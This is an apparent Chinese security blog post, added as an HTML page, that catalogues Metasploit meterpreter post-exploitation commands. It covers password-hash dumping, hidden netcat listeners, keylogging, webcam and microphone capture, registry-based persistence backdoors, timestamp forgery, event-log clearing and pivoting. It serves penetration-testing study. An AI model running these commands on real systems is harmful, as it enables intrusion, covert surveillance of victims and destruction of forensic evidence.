@@ -1,0 +1,434 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>MSF(二) meterpreter常用命令 | 狗剩儿</title>
+<meta name="description" content="小菜鸡。" />
+<link rel="shortcut icon" href="https://foolb.github.io//favicon.ico?v=1577108990368">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://foolb.github.io//styles/main.css">
+
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://foolb.github.io/">
+  <img class="avatar" src="https://foolb.github.io//images/avatar.png?v=1577108990368" alt="">
+  </a>
+  <h1 class="site-title">
+    狗剩儿
+  </h1>
+  <p class="site-description">
+    小菜鸡。
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              MSF(二) meterpreter常用命令
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-12-23
+              </span>
+              <span>
+                7 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <ol>
+<li>高级、动态、可扩展的 Payload
+<ol>
+<li>基于 meterpreter 上下文利用更多漏洞发起攻击</li>
+<li>后渗透测试阶段一站式操作界面</li>
+</ol>
+</li>
+<li>完成基于内存的 DLL 注入式 Payload （不写硬盘）
+<ol>
+<li>注入合法系统进程并建立 stager</li>
+<li>基于 stager 上传和预加载 DLL 进行扩展模块的注入（客户端API）</li>
+<li>基于 stager 建立的 socket 连接建立加密的 TLS/1.0 通信隧道</li>
+<li>利用 TLS 隧道进一步加载后续扩展模块（避免网络取证）</li>
+</ol>
+</li>
+<li>服务端使用C语言编写</li>
+<li>客户端提供基于 ruby 的全特性 API（支持任何语言）</li>
+</ol>
+<!-- more -->
+<h2 id="基本命令">基本命令</h2>
+<h3 id="help">help</h3>
+<h3 id="background-bg">background / bg</h3>
+<h3 id="run-bgrun">run / bgrun</h3>
+<pre><code class="language-bash"># 现在的 5.0.61-dev 版本自带284个模块，下面只列举出常用的信息收集的脚本，执行完成之后结果保存在/.msf4/logs/scripts/脚本名/
+
+run vnc
+
+run scraper # 比较全面的信息收集脚本
+
+run get_local_subnets
+
+run autoroute -p / run post/multi/manage/autoroute
+
+run post/windows/gather/enum_applications
+
+run post/windows/gather/checkvm
+
+run post/windows/gather/smart_hashdump
+
+run getgui -e / run post/windows/manage/enable_rdp
+
+run post/windows/gather/forensics/enum_drives
+...
+
+常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://foolb.github.io//post-images/image-20191216174121920.png" alt="image-20191216174121920"></figure>
+<figure data-type="image" tabindex="2"><img src="https://foolb.github.io//post-images/image-20191216174158284.png" alt="image-20191216174158284"></figure>
+<figure data-type="image" tabindex="3"><img src="https://foolb.github.io//post-images/image-20191216203421161.png" alt="image-20191216203421161"></figure>
+<h3 id="bgkill-bglist">bgkill / bglist</h3>
+<h3 id="cd-ls-cat-pwd-dir-mkdir-mv-rm-rmdir-edit">cd、ls、cat、pwd、dir、mkdir、mv、rm、rmdir、edit</h3>
+<h3 id="lpwd-lcd">lpwd、lcd</h3>
+<h3 id="download-upload">download / upload</h3>
+<figure data-type="image" tabindex="4"><img src="https://foolb.github.io//post-images/image-20191216211536495.png" alt="image-20191216211536495"></figure>
+<pre><code class="language-bash">upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://foolb.github.io//post-images/image-20191216212442684.png" alt="image-20191216212442684"></figure>
+<h3 id="execute">execute</h3>
+<pre><code class="language-bash">tips:执行的命令有参数的话要用引号('' / &quot;&quot;)引起来
+
+execute -f 'nc.exe -lvvp 4444' # 执行nc监听4444端口，缺点会在目标主机弹出窗口
+
+execute -H -f 'nc.exe -lvvp 4444' # 隐藏窗口执行nc监听4444端口
+
+execute -H -i -f cmd.exe # 隐藏窗口执行nc监听4444端口，并和cmd进行交互,相当于获取了cmd（shell命令的效果）
+
+execute -H -d notepad.exe -f nc.exe -a '-lvvp 3344'
+
+-d 在目标主机执行时显示的进程名称（用以伪装）
+
+-m 直接从内存中执行（没有测试成功）
+
+-a 要传递给命令的参数
+</code></pre>
+<figure data-type="image" tabindex="6"><img src="https://foolb.github.io//post-images/image-20191216213540215.png" alt="image-20191216213540215"></figure>
+<figure data-type="image" tabindex="7"><img src="https://foolb.github.io//post-images/image-20191216213606965.png" alt="image-20191216213606965"></figure>
+<figure data-type="image" tabindex="8"><img src="https://foolb.github.io//post-images/image-20191216214434127.png" alt="image-20191216214434127"></figure>
+<h3 id="getuid-getsystem-getprivs">getuid 、getsystem、getprivs</h3>
+<figure data-type="image" tabindex="9"><img src="https://foolb.github.io//post-images/image-20191216221424906.png" alt="image-20191216221424906"></figure>
+<h3 id="getproxy">getproxy</h3>
+<figure data-type="image" tabindex="10"><img src="https://foolb.github.io//post-images/image-20191216221739598.png" alt="image-20191216221739598"></figure>
+<figure data-type="image" tabindex="11"><img src="https://foolb.github.io//post-images/image-20191216221658749.png" alt="image-20191216221658749"></figure>
+<h3 id="getpid">getpid</h3>
+<figure data-type="image" tabindex="12"><img src="https://foolb.github.io//post-images/image-20191216221819649.png" alt="image-20191216221819649"></figure>
+<h3 id="migrate-迁移进程">migrate # 迁移进程</h3>
+<pre><code class="language-cmd">ps # 查看当前主机的进程
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://foolb.github.io//post-images/image-20191214210746177.png" alt="image-20191214210746177"></figure>
+<p>迁移的话只能迁移到当前权限一样的进程，不能向高权限进程迁移。</p>
+<pre><code class="language-bash">migrate PID # 将shell进程迁移到对应PID进程上
+</code></pre>
+<figure data-type="image" tabindex="14"><img src="https://foolb.github.io//post-images/image-20191214211048710.png" alt="image-20191214211048710"></figure>
+<h3 id="hashdump-run-postwindowsgatherhashdump">hashdump / run post/windows/gather/hashdump</h3>
+<p>需要有注册表和SAM [Security Account Manager]的系统的权限</p>
+<p>格式：用户名：SID：LM哈希：NTLM哈希:::</p>
+<figure data-type="image" tabindex="15"><img src="https://foolb.github.io//post-images/image-20191216222811797.png" alt="image-20191216222811797"></figure>
+<h3 id="sysinfo">sysinfo</h3>
+<figure data-type="image" tabindex="16"><img src="https://foolb.github.io//post-images/image-20191216222948693.png" alt="image-20191216222948693"></figure>
+<h3 id="ps-kill">ps / kill</h3>
+<pre><code>PID（process ID）：
+
+PID是程序被操作系统加载到内存成为进程后动态分配的资源。
+
+每次程序执行的时候，操作系统都会重新加载，PID在每次加载的时候都是不同的。
+
+
+PPID（parent process ID）：PPID是程序的父进程号。
+</code></pre>
+<figure data-type="image" tabindex="17"><img src="https://foolb.github.io//post-images/image-20191216223016349.png" alt="image-20191216223016349"></figure>
+<pre><code class="language-bash">kill pid
+</code></pre>
+<figure data-type="image" tabindex="18"><img src="https://foolb.github.io//post-images/image-20191216223133679.png" alt="image-20191216223133679"></figure>
+<h3 id="reboot-shutdown">reboot / shutdown</h3>
+<h3 id="shell">shell</h3>
+<h5 id="执行shell命令获取-windows-cmd-乱码">执行shell命令获取 Windows cmd 乱码</h5>
+<p>命令行执行</p>
+<pre><code class="language-cmd">chcp 65001
+</code></pre>
+<p>解决乱码问题</p>
+<figure data-type="image" tabindex="19"><img src="https://foolb.github.io//post-images/image-20191214221811102.png" alt="image-20191214221811102"></figure>
+<figure data-type="image" tabindex="20"><img src="https://foolb.github.io//post-images/image-20191214221627819.png" alt="image-20191214221627819"></figure>
+<h3 id="show_mount">show_mount</h3>
+<figure data-type="image" tabindex="21"><img src="https://foolb.github.io//post-images/image-20191216224431392.png" alt="image-20191216224431392"></figure>
+<h3 id="search-f-hhhhtxt">search -f hhhh.txt</h3>
+<figure data-type="image" tabindex="22"><img src="https://foolb.github.io//post-images/image-20191216224633399.png" alt="image-20191216224633399"></figure>
+<h3 id="arp-netstat-ipconfig-ifconfig-route">arp / netstat / ipconfig / ifconfig / route</h3>
+<h3 id="portfwd">portfwd</h3>
+<pre><code>    -L &lt;opt&gt;要监听的本地主机（可选）
+
+    -l &lt;opt&gt;要监听的本地端口
+
+    -p &lt;opt&gt;连接到的远程端口
+
+    -r &lt;opt&gt;要连接到的远程主机
+    
+
+portfwd  add -l 4444 -p 3389 -r 192.168.1.102 # 端口转发,本机监听4444,把目标机3389转到本机4444
+
+</code></pre>
+<h3 id="idletime">idletime</h3>
+<p>为显示目标机器空闲多长时间（截止到当前无操作命令的时间）</p>
+<h3 id="resource">resource</h3>
+<figure data-type="image" tabindex="23"><img src="https://foolb.github.io//post-images/image-20191216231149723.png" alt="image-20191216231149723"></figure>
+<figure data-type="image" tabindex="24"><img src="https://foolb.github.io//post-images/image-20191216231224934.png" alt="image-20191216231224934"></figure>
+<h3 id="record_mic-录制声音">record_mic # 录制声音</h3>
+<h3 id="webcam_chat-webcam_list-webcam_snap-webcam_stream">webcam_chat / webcam_list / webcam_snap / webcam_stream</h3>
+<pre><code class="language-bash">webcam_list # 列出所有摄像头
+webcam_snap -i 1 -v false # 每隔一秒钟拍一次照
+webcam_stream # 开启视频
+
+</code></pre>
+<h3 id="screenshot">screenshot</h3>
+<h3 id="keyscan_start-keyscan_dump-keyscan_stop-run-keylogrecorder">keyscan_start / keyscan_dump / keyscan_stop / run keylogrecorder</h3>
+<p>这里需要注意一下windows会话窗口的概念，windows桌面划分为不同的会话(session)，以便于与windows交互。会话0代表控制台，1，2代表远程桌面。所以要截获键盘输入必须在0中进行。可 以使用getdesktop查看或者截张图试试。否则使用setdesktop切换。如果不行就切换到explorer.exe进程中，这样也可以监听到远程桌面连接进来之后的键盘输入数据。</p>
+<h3 id="load-use">load / use</h3>
+<p>load / use之后再输入help，就可以看到关于这个模块的命令说明</p>
+<h3 id="植入后门">植入后门</h3>
+<h4 id="run-metsvc">run metsvc</h4>
+<p>很容易被发现，执行之后会上传三个文件，并建立服务自启动。</p>
+<figure data-type="image" tabindex="25"><img src="https://foolb.github.io//post-images/image-20191223202740790.png" alt="image-20191223202740790"></figure>
+<figure data-type="image" tabindex="26"><img src="https://foolb.github.io//post-images/image-20191223204811635.png" alt="image-20191223204811635"></figure>
+<figure data-type="image" tabindex="27"><img src="https://foolb.github.io//post-images/image-20191223202858638.png" alt="image-20191223202858638"></figure>
+<h4 id="run-persistence-p-windowsx64meterpreterreverse_tcp-s-x-p-3344">run persistence -P windows/x64/meterpreter/reverse_tcp -S -X -p 3344</h4>
+<p>在注册表（HKLM\Software\Microsoft\Windows\Currentversion\Run）中添加键值，达到自启动的目的。</p>
+<pre><code>在测试2012 和 07 的时候在目标机器上反复出现已停止工作的弹窗，而且任务管理里会启动随机字符的进程，容易暴露~~慎用。
+
+OPTIONS:
+ 
+    -A   自动启动一个匹配的exploit/multi/handler来连接到代理
+    -L   如果未使用％TEMP％，则在目标主机中写入有效负载的位置
+    -P   有效负载使用，默认为windows/meterpreter/reverse_tcp
+    -S   作为服务自动启动代理程序（需要SYSTEM权限）
+    -T   要使用的备用可执行模板
+    -U   用户登录时自动启动代理
+    -X   系统引导时自动启动代理程序
+    -h   帮助~~
+    -i   每次连接尝试之间的时间间隔（秒）
+    -p   运行Metasploit的系统正在侦听的端口
+    -r   运行Metasploit监听连接的系统的IP
+
+</code></pre>
+<figure data-type="image" tabindex="28"><img src="https://foolb.github.io//post-images/image-20191223211046477.png" alt="image-20191223211046477"></figure>
+<figure data-type="image" tabindex="29"><img src="https://foolb.github.io//post-images/image-20191223211458078.png" alt="image-20191223211458078"></figure>
+<h3 id="timestomp">timestomp</h3>
+<pre><code>timestomp 1.txt -v
+
+timestomp 1.txt -z &quot;08/22/2013 23:46:48&quot;
+
+</code></pre>
+<figure data-type="image" tabindex="30"><img src="https://foolb.github.io//post-images/image-20191223212517248.png" alt="image-20191223212517248"></figure>
+<figure data-type="image" tabindex="31"><img src="https://foolb.github.io//post-images/image-20191223212624874.png" alt="image-20191223212624874"></figure>
+<h3 id="clearev-清理日志">clearev # 清理日志</h3>
+<figure data-type="image" tabindex="32"><img src="https://foolb.github.io//post-images/image-20191216210519907.png" alt="image-20191216210519907"></figure>
+<figure data-type="image" tabindex="33"><img src="https://foolb.github.io//post-images/image-20191216210508606.png" alt="image-20191216210508606"></figure>
+<h3 id="socks代理">SOCKS代理</h3>
+<p>Metasploit可以作为一个SOCKS代理服务器，具体步骤为首先通过Metasploit的某些模块建立会话，就像本章前面介绍的，建立完会话之后，执行“route add +IP+mask+SID”，本例中我们路由的ip网段为10.1.1.0，然后使用“use auxiliary/server/socks4a”命令来使用sock4a模块，执行run命令 ，socks便会执行</p>
+<p>然后再在命令行下执行proxychains命令，使用代理对目标主机进行扫描，nmap，nc等都可以。</p>
+<h2 id="meterpreter-python-扩展">meterpreter python 扩展</h2>
+<pre><code class="language-cmd">load python 
+
+python_execute &quot;print('Hello,The\'s Meterpreter Python')&quot;
+
+python_execute &quot;import os; cd = os.getcwd()&quot; -r cd
+
+python_import -f xxx.py
+
+</code></pre>
+<figure data-type="image" tabindex="34"><img src="https://foolb.github.io//post-images/image-20191216232142321.png" alt="image-20191216232142321"></figure>
+<figure data-type="image" tabindex="35"><img src="https://foolb.github.io//post-images/image-20191216233220503.png" alt="image-20191216233220503"></figure>
+<h2 id="meterpreter-powershell-扩展">meterpreter powershell 扩展</h2>
+<pre><code>load powershell
+
+</code></pre>
+<figure data-type="image" tabindex="36"><img src="https://foolb.github.io//post-images/image-20191216232544039.png" alt="image-20191216232544039"></figure>
+<h2 id="参考链接">参考链接</h2>
+<p>http://www.vuln.cn/6342</p>
+<p>https://www.cnblogs.com/backlion/p/9484949.html</p>
+<p>https://www.aqniukt.com/my/course/83</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4">基本命令</a>
+<ul>
+<li><a href="#help">help</a></li>
+<li><a href="#background-bg">background / bg</a></li>
+<li><a href="#run-bgrun">run / bgrun</a></li>
+<li><a href="#bgkill-bglist">bgkill / bglist</a></li>
+<li><a href="#cd-ls-cat-pwd-dir-mkdir-mv-rm-rmdir-edit">cd、ls、cat、pwd、dir、mkdir、mv、rm、rmdir、edit</a></li>
+<li><a href="#lpwd-lcd">lpwd、lcd</a></li>
+<li><a href="#download-upload">download / upload</a></li>
+<li><a href="#execute">execute</a></li>
+<li><a href="#getuid-getsystem-getprivs">getuid 、getsystem、getprivs</a></li>
+<li><a href="#getproxy">getproxy</a></li>
+<li><a href="#getpid">getpid</a></li>
+<li><a href="#migrate-%E8%BF%81%E7%A7%BB%E8%BF%9B%E7%A8%8B">migrate # 迁移进程</a></li>
+<li><a href="#hashdump-run-postwindowsgatherhashdump">hashdump / run post/windows/gather/hashdump</a></li>
+<li><a href="#sysinfo">sysinfo</a></li>
+<li><a href="#ps-kill">ps / kill</a></li>
+<li><a href="#reboot-shutdown">reboot / shutdown</a></li>
+<li><a href="#shell">shell</a><br>
+*
+<ul>
+<li><a href="#%E6%89%A7%E8%A1%8Cshell%E5%91%BD%E4%BB%A4%E8%8E%B7%E5%8F%96-windows-cmd-%E4%B9%B1%E7%A0%81">执行shell命令获取 Windows cmd 乱码</a></li>
+</ul>
+</li>
+<li><a href="#show_mount">show_mount</a></li>
+<li><a href="#search-f-hhhhtxt">search -f hhhh.txt</a></li>
+<li><a href="#arp-netstat-ipconfig-ifconfig-route">arp / netstat / ipconfig / ifconfig / route</a></li>
+<li><a href="#portfwd">portfwd</a></li>
+<li><a href="#idletime">idletime</a></li>
+<li><a href="#resource">resource</a></li>
+<li><a href="#record_mic-%E5%BD%95%E5%88%B6%E5%A3%B0%E9%9F%B3">record_mic # 录制声音</a></li>
+<li><a href="#webcam_chat-webcam_list-webcam_snap-webcam_stream">webcam_chat / webcam_list / webcam_snap / webcam_stream</a></li>
+<li><a href="#screenshot">screenshot</a></li>
+<li><a href="#keyscan_start-keyscan_dump-keyscan_stop-run-keylogrecorder">keyscan_start / keyscan_dump / keyscan_stop / run keylogrecorder</a></li>
+<li><a href="#load-use">load / use</a></li>
+<li><a href="#%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8">植入后门</a>
+<ul>
+<li><a href="#run-metsvc">run metsvc</a></li>
+<li><a href="#run-persistence-p-windowsx64meterpreterreverse_tcp-s-x-p-3344">run persistence -P windows/x64/meterpreter/reverse_tcp -S -X -p 3344</a></li>
+</ul>
+</li>
+<li><a href="#timestomp">timestomp</a></li>
+<li><a href="#clearev-%E6%B8%85%E7%90%86%E6%97%A5%E5%BF%97">clearev # 清理日志</a></li>
+<li><a href="#socks%E4%BB%A3%E7%90%86">SOCKS代理</a></li>
+</ul>
+</li>
+<li><a href="#meterpreter-python-%E6%89%A9%E5%B1%95">meterpreter python 扩展</a></li>
+<li><a href="#meterpreter-powershell-%E6%89%A9%E5%B1%95">meterpreter powershell 扩展</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5">参考链接</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://foolb.github.io//post/msfyi-ji-ben-liao-jie-he-chang-yong-ming-ling">
+              <h3 class="post-title">
+                MSF(一)基本了解和常用命令
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | 
+  <a class="rss" href="https://foolb.github.io//atom.xml" target="_blank">RSS</a>
+</div>
+
+<script>
+  hljs.initHighlightingOnLoad()
+
+  let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+  // This should probably be throttled.
+  // Especially because it triggers during smooth scrolling.
+  // https://lodash.com/docs/4.17.10#throttle
+  // You could do like...
+  // window.addEventListener("scroll", () => {
+  //    _.throttle(doThatStuff, 100);
+  // });
+  // Only not doing it here to keep this Pen dependency-free.
+
+  window.addEventListener("scroll", event => {
+    let fromTop = window.scrollY;
+
+    mainNavLinks.forEach((link, index) => {
+      let section = document.getElementById(decodeURI(link.hash).substring(1));
+      let nextSection = null
+      if (mainNavLinks[index + 1]) {
+        nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+      }
+      if (section.offsetTop <= fromTop) {
+        if (nextSection) {
+          if (nextSection.offsetTop > fromTop) {
+            link.classList.add("current");
+          } else {
+            link.classList.remove("current");    
+          }
+        } else {
+          link.classList.add("current");
+        }
+      } else {
+        link.classList.remove("current");
+      }
+    });
+  });
+
+</script>
+
+      </div>
+    </div>
+  </body>
+</html>
